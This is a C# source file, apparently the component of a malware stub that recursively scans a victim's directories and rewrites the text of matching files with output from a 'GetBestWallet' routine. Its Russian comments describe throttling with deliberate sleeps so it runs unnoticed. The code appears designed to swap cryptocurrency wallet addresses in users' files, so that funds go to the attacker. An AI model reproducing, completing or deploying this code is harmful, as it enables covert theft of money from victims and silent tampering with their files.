using Stub.Help.Native;
using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Stub.Help
{
    internal class FileReplace
    {
        public static bool work = false;
        public async static void Replace(string[] directories)
        {
            await Task.Run(() =>
            {
                work = true;
                try
                {
                    foreach (string directoryPath in directories)
                    {
                        foreach (string searchPattern in Config.searchFilesPatterns)
                        {
                            string[] files = Directory.GetFiles(directoryPath, searchPattern, SearchOption.AllDirectories);

                            foreach (string file in files)
                            {
                                FileInfo fileInfo = new FileInfo(file);
                                if (fileInfo.Length > 2 * 1024 * 1024) // Пропускаем файлы весом больше 2 МБ
                                {
                                    continue;
                                }
                                string text = File.ReadAllText(file);
                                string newText = GetBestWallet.Get(text);
                                if (newText != null || text != null)
                                {
                                    text = text.Replace(text, newText);
                                    File.WriteAllText(file, text);
                                    NativeMethods.Sleep(1000);
                                }
                            }
                            NativeMethods.Sleep(1000);
                        }
                        //Поставим задержку что бы снизить нагрузку на CPU (Времени у нас много;D)
                        NativeMethods.Sleep(1000);

                    }
                    work = false;
                }
                catch
                {
                }
            });
        }
    }
}
